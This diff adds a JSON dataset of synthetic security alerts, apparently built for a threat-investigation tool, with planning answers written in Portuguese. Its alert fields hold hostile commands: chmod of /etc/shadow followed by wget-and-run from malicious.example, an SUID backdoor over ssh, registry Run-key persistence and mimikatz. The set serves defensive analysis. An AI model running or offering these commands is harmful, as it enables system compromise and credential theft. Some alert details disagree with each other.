@@ -1,0 +1,450 @@
+[
+  {
+    "question": {
+      "timestamp": "2023-11-15T14:23:45Z",
+      "source_ip": "192.168.1.100",
+      "destination_ip": "10.0.0.5",
+      "hostname": "srv-db-prod00",
+      "user": "admin0",
+      "command": "chmod 777 /etc/shadow; wget http://malicious.example/payload; ./payload &",
+      "severity": "High",
+      "description": "Multiple failed login attempts (15) followed by a successful login with credential reuse pattern. After login, suspicious commands were executed with privileged access.",
+      "logs": "Nov 15 14:20:12 srv-db-prod01 sshd[12345]: Failed password for admin from 192.168.1.100 port 57321 ssh2\nNov 15 14:20:42 srv-db-prod01 sshd[12346]: Failed password for admin from 192.168.1.100 port 57322 ssh2\n[...13 more failed attempts...]\nNov 15 14:23:45 srv-db-prod01 sshd[12360]: Accepted password for admin from 192.168.1.100 port 57335 ssh2\nNov 15 14:24:01 srv-db-prod01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash\nNov 15 14:24:12 srv-db-prod01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow\nNov 15 14:24:23 srv-db-prod01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://malicious.example/payload"
+    },
+    "answer": {
+      "query": "Multiple failed login attempts followed by successful login and suspicious privileged commands execution by user 'admin0' from IP 192.168.1.100 on host srv-db-prod00.",
+      "initial_nodes": [
+        "WindowsAccount",
+        "UserAccount",
+        "Credential",
+        "IPAddress",
+        "WindowsProcess"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Buscar UserAccount ou WindowsAccount com o nome 'admin0'."
+        },
+        {
+          "step": 2,
+          "description": "Verificar falhas de autentica\u00e7\u00e3o e tentativas de login bem-sucedidas associadas a este usu\u00e1rio (EventLog, WindowsEvent)."
+        },
+        {
+          "step": 3,
+          "description": "Identificar IPAddress '192.168.1.100' e rastrear conex\u00f5es de entrada (NetworkConnection, Socket)."
+        },
+        {
+          "step": 4,
+          "description": "Investigar quais processos foram executados pelo usu\u00e1rio 'admin' (WindowsProcess) ap\u00f3s o login."
+        },
+        {
+          "step": 5,
+          "description": "Verificar uso de comandos como 'chmod' e 'wget' nos processos do usu\u00e1rio (Code, Command, File)."
+        },
+        {
+          "step": 6,
+          "description": "Identificar arquivos potencialmente alterados (/etc/shadow) e novos arquivos baixados (File, UNIXFile, ArchiveFile)."
+        },
+        {
+          "step": 7,
+          "description": "Buscar evid\u00eancias de credential dump ou movimenta\u00e7\u00f5es laterais (CredentialDump, NetworkConnection)."
+        },
+        {
+          "step": 8,
+          "description": "Verificar se o payload ainda est\u00e1 em execu\u00e7\u00e3o ou persistente no sistema (WindowsTask, WindowsService, FileSystemObject)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T10:15:30Z",
+      "source_ip": "10.0.0.20",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-0",
+      "user": "user0",
+      "command": "cp /tmp/backdoor /usr/bin/ssh; chmod +s /usr/bin/ssh",
+      "severity": "High",
+      "description": "A file resembling a backdoor was copied to a critical system directory and given SUID permissions.",
+      "logs": "Nov 16 10:15:30 host-malware-0 cp /tmp/backdoor /usr/bin/ssh; chmod +s /usr/bin/ssh"
+    },
+    "answer": {
+      "query": "A file resembling a backdoor was copied to a critical system directory and given SUID permissions. Detected on host host-malware-0 by user 'user0' with source IP 10.0.0.20.",
+      "initial_nodes": [
+        "UNIXFile",
+        "FileSystem",
+        "UserAccount",
+        "WindowsProcess"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Buscar arquivos criados ou modificados recentemente no diret\u00f3rio /usr/bin (File, UNIXFile)."
+        },
+        {
+          "step": 2,
+          "description": "Verificar permiss\u00f5es incomuns atribu\u00eddas a arquivos execut\u00e1veis (FileSystemObject, Permission)."
+        },
+        {
+          "step": 3,
+          "description": "Rastrear qual processo criou ou alterou esse arquivo (UNIXProcess, File)."
+        },
+        {
+          "step": 4,
+          "description": "Identificar o usu\u00e1rio respons\u00e1vel pela a\u00e7\u00e3o (UserAccount)."
+        },
+        {
+          "step": 5,
+          "description": "Verificar persist\u00eancia ou execu\u00e7\u00e3o agendada relacionada ao arquivo (WindowsTask, UNIXCronJob)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T11:15:30Z",
+      "source_ip": "10.0.0.21",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-1",
+      "user": "user1",
+      "command": "powershell -EncodedCommand aGVsbG8gd29ybGQ=",
+      "severity": "High",
+      "description": "Encoded PowerShell command detected, which is a common obfuscation technique used in malware.",
+      "logs": "Nov 16 11:15:30 host-malware-1 powershell -EncodedCommand aGVsbG8gd29ybGQ="
+    },
+    "answer": {
+      "query": "Encoded PowerShell command detected, which is a common obfuscation technique used in malware. Detected on host host-malware-1 by user 'user1' with source IP 10.0.0.21.",
+      "initial_nodes": [
+        "WindowsProcess",
+        "Code",
+        "UserAccount",
+        "Command"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Identificar processos que iniciaram o PowerShell (WindowsProcess, Command)."
+        },
+        {
+          "step": 2,
+          "description": "Verificar o conte\u00fado do comando codificado (Code, Script)."
+        },
+        {
+          "step": 3,
+          "description": "Rastrear o usu\u00e1rio que executou o comando (WindowsAccount)."
+        },
+        {
+          "step": 4,
+          "description": "Buscar conex\u00f5es de rede iniciadas ap\u00f3s a execu\u00e7\u00e3o (TCPConnection, NetworkFlow)."
+        },
+        {
+          "step": 5,
+          "description": "Verificar presen\u00e7a de payloads baixados ou executados (File, ArchiveFile)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T12:15:30Z",
+      "source_ip": "10.0.0.22",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-2",
+      "user": "user2",
+      "command": "",
+      "severity": "High",
+      "description": "Unusual volume of DNS queries from a single host, potentially indicating data exfiltration or C2 activity.",
+      "logs": "Nov 16 12:15:30 host-malware-2 "
+    },
+    "answer": {
+      "query": "Unusual volume of DNS queries from a single host, potentially indicating data exfiltration or C2 activity. Detected on host host-malware-2 by user 'user2' with source IP 10.0.0.22.",
+      "initial_nodes": [
+        "DNSCache",
+        "IPAddress",
+        "NetworkFlow"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Verificar IPAddress que gerou o tr\u00e1fego DNS elevado."
+        },
+        {
+          "step": 2,
+          "description": "Buscar entradas de DNSCache e DNSRecord relacionadas."
+        },
+        {
+          "step": 3,
+          "description": "Correlacionar com hor\u00e1rios e processos ativos no host (EventLog, Process)."
+        },
+        {
+          "step": 4,
+          "description": "Verificar se dom\u00ednios consultados s\u00e3o conhecidos por atividades maliciosas (DomainName, WhoIs)."
+        },
+        {
+          "step": 5,
+          "description": "Identificar conex\u00f5es de sa\u00edda subsequentes (HTTPConnection, TCPConnection)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T13:15:30Z",
+      "source_ip": "10.0.0.23",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-3",
+      "user": "user3",
+      "command": "/media/usb/malware.bin",
+      "severity": "High",
+      "description": "Executable was run from a mounted USB device, which is often used to introduce malware.",
+      "logs": "Nov 16 13:15:30 host-malware-3 /media/usb/malware.bin"
+    },
+    "answer": {
+      "query": "Executable was run from a mounted USB device, which is often used to introduce malware. Detected on host host-malware-3 by user 'user3' with source IP 10.0.0.23.",
+      "initial_nodes": [
+        "Device",
+        "File",
+        "Volume",
+        "UserAccount"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Identificar dispositivos USB conectados recentemente (Device, Volume)."
+        },
+        {
+          "step": 2,
+          "description": "Verificar arquivos executados a partir desses volumes (File, Process)."
+        },
+        {
+          "step": 3,
+          "description": "Rastrear o usu\u00e1rio que executou o bin\u00e1rio (UserAccount)."
+        },
+        {
+          "step": 4,
+          "description": "Buscar persist\u00eancia deixada pelo bin\u00e1rio no sistema (WindowsTask, Service)."
+        },
+        {
+          "step": 5,
+          "description": "Verificar conex\u00f5es externas estabelecidas pelo bin\u00e1rio (NetworkConnection, IPAddress)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T14:15:30Z",
+      "source_ip": "10.0.0.24",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-4",
+      "user": "user4",
+      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\malicious.exe",
+      "severity": "High",
+      "description": "Windows registry modified to execute malicious binary at startup.",
+      "logs": "Nov 16 14:15:30 host-malware-4 reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\malicious.exe"
+    },
+    "answer": {
+      "query": "Windows registry modified to execute malicious binary at startup. Detected on host host-malware-4 by user 'user4' with source IP 10.0.0.24.",
+      "initial_nodes": [
+        "WindowsRegistry",
+        "WindowsAccount",
+        "File",
+        "WindowsTask"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Buscar modifica\u00e7\u00f5es no registro que indicam persist\u00eancia (WindowsRegistry)."
+        },
+        {
+          "step": 2,
+          "description": "Verificar quem executou o comando (WindowsAccount)."
+        },
+        {
+          "step": 3,
+          "description": "Rastrear o bin\u00e1rio configurado para iniciar com o sistema (File, WindowsProcess)."
+        },
+        {
+          "step": 4,
+          "description": "Verificar presen\u00e7a do bin\u00e1rio no sistema e se est\u00e1 ativo (Process, FileSystem)."
+        },
+        {
+          "step": 5,
+          "description": "Analisar conex\u00f5es ou atividades relacionadas ao bin\u00e1rio (NetworkConnection, CredentialDump)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T15:15:30Z",
+      "source_ip": "10.0.0.25",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-5",
+      "user": "user5",
+      "command": "mimikatz.exe",
+      "severity": "High",
+      "description": "Execution of known credential dumping tool detected on a domain controller.",
+      "logs": "Nov 16 15:15:30 host-malware-5 mimikatz.exe"
+    },
+    "answer": {
+      "query": "Execution of known credential dumping tool detected on a domain controller. Detected on host host-malware-5 by user 'user5' with source IP 10.0.0.25.",
+      "initial_nodes": [
+        "CredentialDump",
+        "WindowsProcess",
+        "WindowsAccount"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Identificar execu\u00e7\u00e3o do processo mimikatz.exe (WindowsProcess)."
+        },
+        {
+          "step": 2,
+          "description": "Verificar o usu\u00e1rio que iniciou o processo (WindowsAccount)."
+        },
+        {
+          "step": 3,
+          "description": "Buscar extra\u00e7\u00f5es de credenciais no sistema (CredentialDump, Credential)."
+        },
+        {
+          "step": 4,
+          "description": "Rastrear conex\u00f5es suspeitas ap\u00f3s a execu\u00e7\u00e3o (Socket, NetworkConnection)."
+        },
+        {
+          "step": 5,
+          "description": "Analisar poss\u00edveis movimentos laterais com as credenciais obtidas (UserAccount, IPAddress)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T16:15:30Z",
+      "source_ip": "10.0.0.26",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-6",
+      "user": "user6",
+      "command": "",
+      "severity": "High",
+      "description": "Host initiated network traffic to an IP address present on threat intelligence blacklists.",
+      "logs": "Nov 16 16:15:30 host-malware-6 "
+    },
+    "answer": {
+      "query": "Host initiated network traffic to an IP address present on threat intelligence blacklists. Detected on host host-malware-6 by user 'user6' with source IP 10.0.0.26.",
+      "initial_nodes": [
+        "IPAddress",
+        "NetworkConnection",
+        "DomainName"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Identificar IPAddress de destino da conex\u00e3o (IPAddress)."
+        },
+        {
+          "step": 2,
+          "description": "Verificar o processo que originou a conex\u00e3o (WindowsProcess, NetworkFlow)."
+        },
+        {
+          "step": 3,
+          "description": "Correlacionar com dom\u00ednio associado ao IP (DNSRecord, DomainName)."
+        },
+        {
+          "step": 4,
+          "description": "Rastrear o arquivo/processo respons\u00e1vel por esta comunica\u00e7\u00e3o (File, ApplicationAccount)."
+        },
+        {
+          "step": 5,
+          "description": "Investigar persist\u00eancia ou outros IOC associados (WindowsService, FileSystemObject)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T17:15:30Z",
+      "source_ip": "10.0.0.27",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-7",
+      "user": "user7",
+      "command": "open invoice_2023.pdf",
+      "severity": "High",
+      "description": "Opening of a malicious PDF triggered a vulnerability exploit in the PDF reader.",
+      "logs": "Nov 16 17:15:30 host-malware-7 open invoice_2023.pdf"
+    },
+    "answer": {
+      "query": "Opening of a malicious PDF triggered a vulnerability exploit in the PDF reader. Detected on host host-malware-7 by user 'user7' with source IP 10.0.0.27.",
+      "initial_nodes": [
+        "PDFFile",
+        "ApplicationAccount",
+        "Process"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Buscar abertura de arquivos PDF no sistema (PDFFile, FileSystemObject)."
+        },
+        {
+          "step": 2,
+          "description": "Verificar qual processo foi iniciado como resultado (Process, Thread)."
+        },
+        {
+          "step": 3,
+          "description": "Analisar o comportamento do processo ap\u00f3s abertura do arquivo (FileAccess, Memory)."
+        },
+        {
+          "step": 4,
+          "description": "Identificar usu\u00e1rio envolvido na a\u00e7\u00e3o (UserAccount)."
+        },
+        {
+          "step": 5,
+          "description": "Verificar se houve execu\u00e7\u00e3o de c\u00f3digo n\u00e3o autorizado ou drop de payload (Code, Library)."
+        }
+      ]
+    }
+  },
+  {
+    "question": {
+      "timestamp": "2023-11-16T18:15:30Z",
+      "source_ip": "10.0.0.28",
+      "destination_ip": "192.168.1.10",
+      "hostname": "host-malware-8",
+      "user": "user8",
+      "command": "",
+      "severity": "High",
+      "description": "Malicious browser extension detected harvesting stored credentials.",
+      "logs": "Nov 16 18:15:30 host-malware-8 "
+    },
+    "answer": {
+      "query": "Malicious browser extension detected harvesting stored credentials. Detected on host host-malware-8 by user 'user8' with source IP 10.0.0.28.",
+      "initial_nodes": [
+        "BrowserCookie",
+        "Credential",
+        "ApplicationAccount"
+      ],
+      "exploration_plan": [
+        {
+          "step": 1,
+          "description": "Verificar extens\u00f5es instaladas no navegador (WebPage, BrowserExtension)."
+        },
+        {
+          "step": 2,
+          "description": "Buscar acessos a dados sens\u00edveis como BrowserCookie e Credential."
+        },
+        {
+          "step": 3,
+          "description": "Rastrear usu\u00e1rio que executou o navegador (ApplicationAccount)."
+        },
+        {
+          "step": 4,
+          "description": "Identificar uploads ou exfiltra\u00e7\u00e3o de dados (NetworkFlow, URLVisit)."
+        },
+        {
+          "step": 5,
+          "description": "Investigar persist\u00eancia da extens\u00e3o e impacto (CookieHistory, DigitalAccount)."
+        }
+      ]
+    }
+  }
+]
